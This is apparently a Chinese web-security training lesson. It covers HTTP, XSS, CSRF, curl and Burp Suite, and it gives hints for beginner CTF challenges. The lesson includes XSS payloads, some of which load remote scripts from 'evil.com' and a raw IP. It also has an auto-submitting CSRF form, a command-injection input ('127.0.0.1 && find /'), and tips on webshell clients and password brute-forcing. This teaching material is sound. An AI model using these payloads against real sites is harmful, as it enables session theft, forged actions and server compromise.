# 第 6 天：WEB 基础

当你访问一个网址的时候，到底发生了什么？

- 准备访问一个地址
- 浏览器向服务器发送请求
- 服务器发回来一些回应
- 浏览器渲染那些回应

但是，有什么细节吗？

- 发过去了多少请求？
- 浏览器是怎么生成那些请求的？
- 这期间的正确传输是怎么做到的？

## 网络是怎么运作的？

- OSI & TCP/IP 模型
- 前端，后端

- 网络层
- 传输层
- 应用层

## 什么是 HTTP？

- HTTP 定义了与服务器进行交互的不同方法，比如 GET、POST，还有 PUT、DELETE、HEAD、OPTIONS、TRACE、CONNECT 等。
- HTTP 请求：客户端向服务器发送请求。
- HTTP 响应：服务器向客户端发送响应。

### GET

请求指定的页面信息。

- 可被缓存
- 保留在浏览器历史记录中
- 可被收藏为书签
- 不应在处理敏感数据时使用
- 有长度限制
- 只应当用于取回数据

### POST

向指定资源提交数据进行处理请求。

- 不会被缓存
- 不会保留在浏览器历史记录中
- 不能被收藏为书签
- 对数据长度没有要求

### 响应状态码

200：一切正常。

206：Partial Content。当从客户端发送 Range 头，表示只请求资源的一部分时，将使用此响应代码。

301：永久重定向。旧地址的资源已经被永久地移除了。

302：临时重定向，但是旧地址的资源还在。

307：临时重定向，与 302 类似。收到 307 响应码后，约定客户端应保持请求方法不变向新的地址发出请求

> 为何引入？部分浏览器在收到 302 响应时，直接使用 GET 方式访问在 Location 头部中规定的 URI，而无视原先请求的方法。

400：Bad Request。客户端请求的语法错误，服务器无法理解。

401：Unauthorized。请求要求用户的身份认证。

403：forbidden，禁止访问。一般是权限设置的。

404：找不到网页。

500：internal server error。

### 请求头处的相关攻击

- XFF 伪造
- Referer 伪造
- User-Agent 伪造
- Cookie 盗用

## 跨站脚本 XSS

跨站脚本（Cross-site scripting，XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在查看网页时就会受到影响。

### 同源策略

同源：域名，协议，端口相同。

跨域：浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域。

页面中的链接，重定向以及表单提交是不会受到同源策略限制的；如果一个内容时跨域引用的，那么它就不能被 JS 读写。

### 跨域资源共享

往 HTTP 里面引入了一个新的请求头和响应头：

- Origin 请求头（客户端设置）
- Access-Control-Allow-Origin 响应头（服务端设置），标识哪些站点可以请求文件。

比如 Access-Control-Allow-Origin = "*"：允许任意站点请求文件。

Access-Control-Allow-Origin = "http://xxx.com:1234"：这个站点的 1234 端口可以访问文件。

### XSS 的类型

- 反射型 XSS
- 存储型 XSS
- 基于 DOM 的 XSS
- Self XSS：运行了恶意代码的人就是受害者。

## JS 基础

console.log("xxx")：打印字符串。

eval：可用于执行多条 js 代码。

`eval("alert(1)")`

btoa：base64 编码。

atob：base64 解码。

```js
>> console.log(btoa("114514"))
MTE0NTE0
>> console.log(atob("MTE0NTE0"))
114514
```

使用 xhr 发送 GET 请求：

```js
var xhr = new XMLHttpRequest();
xhr.open("GET", 'http://114.5.1.4/?a=1&b=2', true);
xhr.send(null)
```

使用 xhr 发送 POST 请求：

```js
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://114.5.1.4/xxx', true);
xhr.send("foo=bar&ccc=ddd");
```

使用 fetch 发送 GET 请求：

```js
fetch('http://114.5.1.4/?a=1&b=2')
```

使用 fetch 发送 POST 请求：

```js
fetch('http://114.5.1.4',{
	 method: 'post',
	 body: 'a=1&b=2'
	 // method: 'no-cors'
})
```

### XSS payload

这些是常用的 XSS 触发器。

```html
<script>alert(1)</script>
<img src=xxxx οnerrοr=alert(1)>
<a href="javascript:alert(1);">test</a>
<svg/onload=alert(1)>
```

远程加载：

```html
<script src="http://evil.com/xx.js"></script>
<script src='//114.5.1.4/1.js'></script>
<script src='//114.5.1.4'>
<script src=//2526951965>
```

在 URL 上动手脚：

```html
// http://xxx.com/#alert(1)
<script>eval(document.location.hash.substr(1))</script>
```

动用 jQuery：

```html
<script src='https://code.jquery.com/jquery-3.3.1.min.js'></script>
<a href="javascript:$.getScript('http://114.5.1.4/1.js')">Click</a>
```

### 抵挡 XSS

#### HttpOnly

如果有个 Cookie 有 HttpOnly 的属性，那么网页的 JS 就不能访问这个 Cookie。既然访问都不能访问，更别提读写了。

#### 文本过滤

- 输入检查（过滤恶意标签）
- 输出检查（尖括号？单双引号？……）
- 处理富文本：选择安全的标签

## 跨站请求伪造 CSRF

跨站请求伪造（Cross-site request forgery，CSRF 或者 XSRF），也被称为 one-click attack 或者 session riding，是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。

跟跨站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

让用户访问即可发起一次 GET 请求：

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

让用户访问即可发起一次 POST 请求：

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
	<input name="username" type="hidden" value="CSRFd" />
	<input type="submit" value="Submit Request" />
</form>

<script>
	document.getElementById("autosubmit").submit();
</script>
```

### 抵挡 CSRF

- 验证码
- Referer Check：用于检查请求是否来自于合法的“源”。
- CSRF Token：CSRF Token 需要同时放在表单中和 session 中，提交表单时，服务器要验证表单中的 Token 是否与用户 session 或者 cookie 中的 Token 一致。

## Curl

### 发起 GET 请求

```shell
curl http://114.5.1.4
```

### 发起 POST 请求

```shell
curl http://114.5.1.4 -X POST
curl http://114.5.1.4 -X POST -d "a=1&b=1"
curl http://114.5.1.4 -X POST -d "{'yyy':'ccc'}" -H "Content-Type: application/json"
```

当使用参数 -d, curl 自动携带 Content-Type: application/x-www-form-urlencoded；并且 `-X POST` 可以省略，因为会隐式发起 POST 请求。

### 使用 curl 上传文件

```shell
curl http://114.5.1.4 -X POST -F "file=@1.txt"
curl http://114.5.1.4 -X POST -F "file=@1.txt" -F "a=1"
```

用 -F 参数，强制 curl 发出多表单数据的 POST 请求，自动携带 -H Content-Type: multipart/form-data。当需要上传图像或其他二进制文件时，发送多表单数据非常有用。

### Redirect 重定向

```shell
curl -L https://www.baidu.com
```

使 curl 始终遵循 301、302、303 或任何其他 3XX 重定向。默认情况下，curl 不遵循重定向。

### 基础的用户验证

```shell
curl -u 'user:pswdi' https://www.baidu.com
curl https://user:pswd@baidu.com
```

### 打印响应

```shell
curl -i https://www.baidu.com # 同时打印响应头和正文
curl -I https://www.baidu.com # 只打印响应头
```

### 代理设置

Socks5 代理：

```shell
curl -x socks5://james:cats@xxx.com:8080 https://www.baidu.com
```

### SSL 证书

忽略 SSL 证书：

```shell
curl -k https://www.baidu.com
```

也可以指定证书版本： curl (-1 -2 -3) 代表 SSLv1、SSLv2、SSLv3。

### 静默输出

```shell
curl -s https://www.baidu.com
```

### Curl 调试

```shell
curl -v https://www.baidu.com
```

- 以 `>` 开头的行是发送给服务器的数据。
- 以 `>` 开头的行是从服务器接收的数据。
- 以 `*` 开头的行如连接信息、SSL 握手信息、协议信息等。


–trace 参数：用来启用所有传入和传出数据的完整跟踪转储。跟踪转储打印发送和接收的所有字节的 hexdump。

```shell
curl --trace - https://www.baidu.com
```

## BurpSuite

### 使用之前

- 打开 burp，勾选 proxy-options 下打着勾，记下端口
- 浏览器里打开 proxy switch omega 新建情景选项，添加 IP 127.0.0.1，端口是刚才的端口，并启用
- 刷新一下网页

### 模块

- 爆破模块 intruder
- 流量重放 repeater
- 解码编码 decoder
- Proxy 模块

## 今天的作业

!!! warning "警告"
	抄袭行为是严厉禁止的。


### view_source

??? done "提示"
	F12 就好了。

### get_post

??? done "提示"
	GET 方式就在 URL 后面加个 `?a=1`。

	POST 方式可以用 HackBar 给一个 `b=2`。

### robots

??? done "提示"
	robots 协议放在根目录的 `robots.txt` 下。

	去访问 `robots.txt`，说是有个 `f1ag_1s_h3re.php`。里面就是 flag。

### backup

??? done "提示"
	盲猜 `index.php.bak`。

### cookie

??? done "提示"
	flag 躺在 `cookie.php` 的消息头里面。

### disabled_button

??? done "提示"
	把那个按钮的 `disabled` 字段扔了就行了。

### weak_auth

??? done "提示"
	首先提示 please login as admin，那么用户名就是 admin 了。

	用户名输入 admin 后，输入密码提示 password error。

	F12 发现一行注释，maybe you need a dictionary。好家伙，明摆着是要爆破是吧。

	拉出 burpsuite 的 intruder 爆破手，然后随便找个字典爆破一下就行了。

### simple_php

??? done "提示"
	`$a==0 and $a`？给 a 一个字符串内容，$a==0 竟然是成立的。

	看起来 b 不能是数字，并且 b 要大于 1234。那个 1234 是数字吧？这怎么比较呢……？

	查了一下，字符串会以它开头的一串数字为准，还有科学计数法的情况。让 b = 99999a 就行了。

	PHP 这是什么鬼类型比较啊。

### xff_referer

??? done "提示"
	先是限定 123.123.123.123，拿个 burpsuite 出来先篡改一下：`X-Forwarded-For: 123.123.123.123`。

	然后又说必须来自 https://www.google.com。继续改 Referer 就行了。

### webshell

??? done "提示"
	看起来对面是说会执行按 shell 发过去的任何指令。

	说是有个叫蚁剑的工具，装了一下，建议在这之前关闭病毒监测软件。

	连上就能找到 flag.txt 了。

### command_execution

??? done "提示"
	没写 WAF？试了一下，是把输入的字符串后面直接接一个 `ping -c 3 ` 然后执行。那我就直接在后面接指令了。

	我猜 flag 应该是藏进了一个 .txt 文件吧？输入 `127.0.0.1 && find / -name "*.txt"`。果然找到了。

### simple_js

??? done "提示"
	看了一下 JS。

	```js
	function dechiffre(pass_enc){
		var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
		var tab  = pass_enc.split(',');
		var tab2 = pass.split(',');
		var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
		k = j + (l) + (n=0);
		n = tab2.length;
		for(i = (o=0); i < (k = j = n); i++ ){
			o = tab[i-l];
			p += String.fromCharCode((o = tab2[i]));
			if(i == 5)break;
		}
		for(i = (o=0); i < (k = j = n); i++ ){
			o = tab[i-l];
			if(i > 5 && i < k-1)
				p += String.fromCharCode((o = tab2[i]));
		}
		p += String.fromCharCode(tab2[17]);
		pass = p;
		return pass;
	}
	String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

	h = window.prompt('Enter password');
	alert( dechiffre(h) );
	```

	好家伙，那个 dechiffre 不管输入啥，输出都是 FAUX PASSWORD HAHA。玩我呢。

	```js
	String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
	```

	这是干什么？fromCharCode？是个编了码的字符串吗？

	解一下，发现是一个数组。好像都是 ascii。

	转一下，确实是这样。填到 Cyberpeace{xxxxxxxxx} 里面就好了。